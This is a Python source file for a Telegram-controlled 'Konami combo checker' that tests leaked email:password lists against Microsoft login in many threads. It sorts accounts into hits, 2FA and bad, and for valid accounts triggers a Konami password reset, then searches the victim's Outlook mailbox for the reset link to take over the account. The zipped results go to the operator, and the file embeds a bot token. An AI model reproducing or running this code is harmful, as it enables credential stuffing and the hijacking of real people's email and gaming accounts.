import sys, os, re, json, time, random, threading, requests, zipfile
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from email.utils import parsedate_to_datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8879666700:AAGfBfwt7SnvFPusfW82cnBaKu2JwhZG68Y"
ADMIN_ID = 7969180514

THREAD_COUNT = 5

HITS_FILE = "hotmailhits.txt"
KONAMI_HITS_FILE = "konamihits.txt"
TWOFA_FILE = "2fa.txt"
BAD_FILE = "bad.txt"
ZIP_FILE = "konamicombohits.zip"

KONAMI_URL = "https://my.konami.net/en_GB/password-reminder/input-email-address"
KONAMI_LINK_PATTERN = "https://my.konami.net/en_GB/password-reminder/register-password"

tarama_durdur = {}
multi_bekleyen = {}

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass

def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass

def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        content = requests.get(file_url, timeout=30).text
        return content
    except:
        return None

def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd and "@" in email:
                return f"{email}:{pwd}"
    return None

def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya:
            continue
        if not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    return list(dict.fromkeys(tum_hesaplar))

batmanparkyetkilisi = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def ataturkparki():
    return random.choice(batmanparkyetkilisi)

class marazali:
    REQ = 25

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.s = self.toyotacorollabest()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.cid = ""
        self.gelsinhayatbildigigibi = None
        self.bilmemhangiruzgaratti = None
        self.sahteparantezleracmasakin = (
            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )

    def toyotacorollabest(self):
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        return s

    def nihathatipoglu(self, tag):
        try:
            h = {
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
            text = r.text
            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
                 or re.search(r'value="(.+?)"', text, re.S)
                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
            if not m:
                return "BAD"
            sFTTag = m.group(1)
            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
                  or re.search(r"urlPost:'(.+?)'", text, re.S)
                  or re.search(r'urlPost:"(.+?)"', text, re.S)
                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
            if not m2:
                return "BAD"
            urlPost = m2.group(1).replace("&amp;", "&")
            data = {
                "login": self.email,
                "loginfmt": self.email,
                "passwd": self.password,
                "PPFT": sFTTag
            }
            h2 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }
            r2 = self.s.post(urlPost, data=data, headers=h2,
                             allow_redirects=True, timeout=self.REQ, verify=False)
            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                if token != "None":
                    self.gelsinhayatbildigigibi = token
                    return "SUCCESS"
            if "cancel?mkt=" in r2.text:
                try:
                    kotukardesim = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
                    oyleeeemi = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
                    hmmm = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
                    if kotukardesim and oyleeeemi and hmmm:
                        dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                        if action:
                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
                                              allow_redirects=True, timeout=self.REQ, verify=False)
                            kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if kurmancihergulee:
                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
                                                 timeout=self.REQ, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                if token != "None":
                                    self.gelsinhayatbildigigibi = token
                                    return "SUCCESS"
                except:
                    pass
            if any(v in r2.text for v in [
                "recover?mkt", "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"
            ]):
                return "2FA"
            fatihterim = r2.text.lower()
            if any(v in fatihterim for v in [
                "password is incorrect", "account doesn't exist",
                "that microsoft account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
                "help us protect your account", "your account or password is incorrect"
            ]):
                return "BAD"
            return "BAD"
        except:
            return "ERROR"

    def kimseyisevemem(self, tag):
        try:
            self.sahteparantezleracmasakin = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=00000000402B5328"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            h = {"User-Agent": ataturkparki()}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.gelsinhayatbildigigibi = tok
                    return tok
            self.soyleyememyeminederim = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.bilmemhangiruzgaratti = tok
                    return tok
            return None
        except:
            return None

    def ahhhelerimtitriyor(self, tag):
        try:
            pikniksararbugunlerde = self.s.cookies.get("MSPCID", "")
            if pikniksararbugunlerde:
                self.cid = pikniksararbugunlerde.upper()
                return True
            ofbiratesbasiyor = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
            if ofbiratesbasiyor:
                self.cid = ofbiratesbasiyor.group(1).upper()
                return True
            self.cid = self.email.upper().replace("@", "").replace(".", "")
            return True
        except:
            return False

    def konami_sifirla(self):
        try:
            headers = {
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            r = self.s.get(KONAMI_URL, headers=headers, timeout=30, verify=False)
            if r.status_code != 200:
                return False
            
            action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
            if action_match:
                action = action_match.group(1)
                if action.startswith('/'):
                    action = f"https://my.konami.net{action}"
            else:
                action = KONAMI_URL
            
            email_field = None
            inputs = re.findall(r'<input[^>]*>', r.text)
            for inp in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
                if name_match:
                    name = name_match.group(1)
                    if 'mail' in name.lower() or 'email' in name.lower():
                        email_field = name
                        break
            
            if not email_field:
                email_field = 'email'
            
            data = {}
            for inp in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
                value_match = re.search(r'value=["\']([^"\']*)["\']', inp)
                if name_match:
                    name = name_match.group(1)
                    value = value_match.group(1) if value_match else ''
                    data[name] = value
            
            data[email_field] = self.email
            
            post_headers = headers.copy()
            post_headers["Content-Type"] = "application/x-www-form-urlencoded"
            post_headers["Origin"] = "https://my.konami.net"
            post_headers["Referer"] = KONAMI_URL
            
            r2 = self.s.post(action, data=data, headers=post_headers, timeout=30, verify=False)
            return True
        except:
            return False

    def konami_mesaj_kontrol(self, token):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
            query = 'from:"konami-info@konami.net"'
            body = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": 10,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": query},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
            }
            r = self.s.post(url, params=params, headers=h, json=body, timeout=30, verify=False)
            
            if r.status_code != 200:
                return False, None
            
            data = r.json()
            
            for es in data.get("EntitySets", []):
                results = es.get("Results", [])
                if results:
                    first = results[0]
                    date_str = first.get("DateTimeReceived") or first.get("DateTimeLastModified")
                    msg_date = None
                    if date_str:
                        try:
                            msg_date = parsedate_to_datetime(date_str).timestamp()
                        except:
                            pass
                    body_text = str(first)
                    has_link = KONAMI_LINK_PATTERN in body_text
                    return has_link, msg_date
            
            return False, None
        except:
            return False, None

    def check(self, tag):
        status = self.nihathatipoglu(tag)
        if status != "SUCCESS":
            return status, None
        self.ahhhelerimtitriyor(tag)
        token = self.kimseyisevemem(tag)
        if not token:
            return "BAD", None
        
        self.konami_sifirla()
        
        for i in range(5):
            time.sleep(1)
            has_link, msg_date = self.konami_mesaj_kontrol(token)
            
            if has_link:
                if msg_date:
                    simdi = time.time()
                    if simdi - msg_date < 60:
                        return "KONAMI_HIT", msg_date
                else:
                    return "KONAMI_HIT", None
        
        return "SUCCESS", None

def create_zip():
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in [KONAMI_HITS_FILE, HITS_FILE, TWOFA_FILE, BAD_FILE]:
                if os.path.exists(f) and os.path.getsize(f) > 0:
                    zf.write(f, os.path.basename(f))
        return True
    except:
        return False

def benferooolum():
    for f in [KONAMI_HITS_FILE, HITS_FILE, TWOFA_FILE, BAD_FILE]:
        with open(f, 'w', encoding='utf-8') as fh:
            pass

def ana_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Start", "callback_data": "baslat"},
             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
            [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"},
             {"text": "📊 Status", "callback_data": "durum"}],
        ]
    }
    
    text = (
        f"╔══════════════════════════════════════════════╗\n"
        f"║     KONAMI COMBO CHECKER - JULIAN           ║\n"
        f"║     👑 ADMIN ONLY 👑                        ║\n"
        f"╚══════════════════════════════════════════════╝\n\n"
        f"⚡ Thread: {THREAD_COUNT}\n"
    )
    send_message(chat_id, text, keyboard)

def durum_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    text = f"👑 STATUS\n\n⚡ Thread: {THREAD_COUNT}\n📂 Limitsiz\n"
    send_message(chat_id, text)

def thread_menu(chat_id):
    if str(chat_id) != str(ADMIN_ID):
        return
    global THREAD_COUNT
    keyboard = {
        "inline_keyboard": [
            [{"text": "1", "callback_data": "thread_1"},
             {"text": "2", "callback_data": "thread_2"},
             {"text": "3", "callback_data": "thread_3"}],
            [{"text": "4", "callback_data": "thread_4"},
             {"text": "5", "callback_data": "thread_5"},
             {"text": "10", "callback_data": "thread_10"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"⚡ THREAD SETTINGS\n\nCurrent: {THREAD_COUNT} Thread", keyboard)

def tarama_yap(chat_id, accounts, dosya_adi):
    global THREAD_COUNT
    benferooolum()
    
    dogrudogru = len(accounts)
    babasarkikalmadi = time.time()
    tarama_durdur[chat_id] = False
    
    egriegri = {"checked": 0, "konami_hit": 0, "hit": 0, "twofa": 0, "bad": 0, "errors": 0}
    
    lock = threading.Lock()
    semaphore = threading.BoundedSemaphore(THREAD_COUNT)
    
    sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": chat_id, "text": "📊 Scanning started..."}, timeout=15).json()
    progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None

    def check_one(combo):
        nonlocal egriegri
        try:
            if tarama_durdur.get(chat_id, False):
                semaphore.release()
                return
            email, password = combo.split(":", 1)
            tag = email.split("@")[0][:12]
            
            c = marazali(email, password, None)
            status, msg_date = c.check(tag)
            
            with lock:
                if status == "KONAMI_HIT":
                    egriegri["konami_hit"] += 1
                    with open(KONAMI_HITS_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    print(f"🎮 KONAMI HIT: {combo}", flush=True)
                elif status == "SUCCESS":
                    egriegri["hit"] += 1
                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    print(f"✅ HIT: {combo}", flush=True)
                elif status == "2FA":
                    egriegri["twofa"] += 1
                    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    print(f"🔐 2FA: {combo}", flush=True)
                else:
                    egriegri["bad"] += 1
                    with open(BAD_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
        except Exception as e:
            with lock:
                egriegri["errors"] += 1
        finally:
            with lock:
                egriegri["checked"] += 1
            semaphore.release()

    def progress_updater():
        nonlocal egriegri, dogrudogru, babasarkikalmadi
        while egriegri["checked"] < dogrudogru:
            time.sleep(3)
            if tarama_durdur.get(chat_id, False):
                break
            with lock:
                checked = egriegri["checked"]
                konami = egriegri["konami_hit"]
                hit = egriegri["hit"]
                twofa = egriegri["twofa"]
                bad = egriegri["bad"]
                errors = egriegri["errors"]
            total = dogrudogru
            elapsed = time.time() - babasarkikalmadi
            yuzde = (checked / total) * 100 if total > 0 else 0
            cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
            filled = int(20 * checked // total) if total > 0 else 0
            bar = '█' * filled + '░' * (20 - filled)
            mesaj = (
                f"📊 SCANNING IN PROGRESS\n\n"
                f"📁 File: {dosya_adi}\n"
                f"📊 Progress: {checked}/{total} ({yuzde:.1f}%)\n"
                f"{bar}\n\n"
                f"🎮 KONAMI HITS: {konami}\n"
                f"✅ HITS: {hit}\n"
                f"🔐 2FA: {twofa}\n"
                f"❌ BAD: {bad}\n"
                f"⚠️ ERRORS: {errors}\n\n"
                f"⏰ Elapsed: {int(elapsed)}s\n"
                f"⚡ CPM: {int(cpm)}\n\n"
                f"Stop: /stop"
            )
            if progress_message_id:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                  data={"chat_id": chat_id, "message_id": progress_message_id, "text": mesaj}, timeout=15)
                except:
                    pass

    updater = threading.Thread(target=progress_updater, daemon=True)
    updater.start()

    threads = []
    for combo in accounts:
        if tarama_durdur.get(chat_id, False):
            break
        semaphore.acquire()
        t = threading.Thread(target=check_one, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - babasarkikalmadi
    durdu = tarama_durdur.get(chat_id, False)
    zip_olustu = create_zip()
    
    stats = (
        f"{'⏹️ SCAN STOPPED' if durdu else '✅ SCAN COMPLETED'} ({int(elapsed)}s)\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔱 Total: {dogrudogru}\n"
        f"🎮 KONAMI HITS: {egriegri['konami_hit']}\n"
        f"✅ HITS: {egriegri['hit']}\n"
        f"🔐 2FA: {egriegri['twofa']}\n"
        f"❌ BAD: {egriegri['bad']}\n"
        f"⚠️ ERRORS: {egriegri['errors']}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Sending result file..."
    )
    send_message(chat_id, stats)
    
    if zip_olustu:
        send_document(chat_id, ZIP_FILE)

def telegram_bot():
    global offset, THREAD_COUNT
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        if str(chat_id) != str(ADMIN_ID):
                            continue
                        data_cb = cb["data"]
                        if data_cb == "main_menu":
                            ana_menu(chat_id)
                        elif data_cb == "durum":
                            durum_menu(chat_id)
                        elif data_cb == "baslat":
                            send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
                        elif data_cb == "multi_start":
                            send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
                            multi_bekleyen[chat_id] = []
                        elif data_cb == "thread_menu":
                            thread_menu(chat_id)
                        elif data_cb.startswith("thread_"):
                            THREAD_COUNT = int(data_cb.split("_")[1])
                            send_message(chat_id, f"✅ Thread set to {THREAD_COUNT}.")
                            ana_menu(chat_id)
                        continue
                    if "message" not in update:
                        continue
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    if str(chat_id) != str(ADMIN_ID):
                        continue
                    if "document" in msg:
                        file_id = msg["document"]["file_id"]
                        file_name = msg["document"].get("file_name", "combo.txt")
                        
                        if chat_id in multi_bekleyen:
                            multi_bekleyen[chat_id].append((file_id, file_name))
                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])} files. Type /bitti when done.")
                        else:
                            send_message(chat_id, "📂 File received, downloading...")
                            content = download_file(file_id)
                            if content is None:
                                send_message(chat_id, "❌ File could not be downloaded.")
                                continue
                            with open("uploaded_combo.txt", "w", encoding="utf-8") as f:
                                f.write(content)
                            accounts = cokludosyayukle(["uploaded_combo.txt"])
                            if not accounts:
                                send_message(chat_id, "❌ No valid accounts found.")
                                continue
                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning started...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                            t.start()
                    elif msg.get("text") == "/start":
                        ana_menu(chat_id)
                    elif msg.get("text") == "/stop":
                        tarama_durdur[chat_id] = True
                        send_message(chat_id, "⏹️ Stopping scan... Results will be sent shortly.")
                    elif msg.get("text") == "/durum":
                        durum_menu(chat_id)
                    elif msg.get("text") == "/thread":
                        thread_menu(chat_id)
                    elif msg.get("text") == "/bitti":
                        if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                            send_message(chat_id, "📂 Downloading and merging all files...")
                            tum_hesaplar = []
                            for fid, fname in multi_bekleyen[chat_id]:
                                content = download_file(fid)
                                if content:
                                    with open(f"multi_{fid}.txt", "w", encoding="utf-8") as f:
                                        f.write(content)
                                    hesaplar = cokludosyayukle([f"multi_{fid}.txt"])
                                    tum_hesaplar.extend(hesaplar)
                            benzersiz = list(dict.fromkeys(tum_hesaplar))
                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning started...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                            t.start()
                            del multi_bekleyen[chat_id]
                        else:
                            send_message(chat_id, "❌ Start Multi Scan first.")
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    print("Bot started...")
    telegram_bot()
